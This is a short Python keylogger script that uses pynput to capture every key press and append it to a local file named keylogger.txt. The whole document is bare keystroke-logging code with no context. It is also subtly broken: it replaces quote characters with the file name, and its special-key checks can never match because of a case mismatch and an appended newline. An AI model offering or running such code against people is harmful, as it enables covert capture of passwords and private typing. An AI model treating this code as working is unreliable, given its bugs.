from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key) + '\n'
    letter = letter.replace("'","keylogger.txt")
    if letter == 'key.space':
        letter = ' '
    if letter =='key.shift_r':
        letter = ''
    if letter ==  'key.ctrl_l':
        letter = ''
    if letter == 'key.enter':
        letter = '\n'    
    with open("keylogger.txt", "a") as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()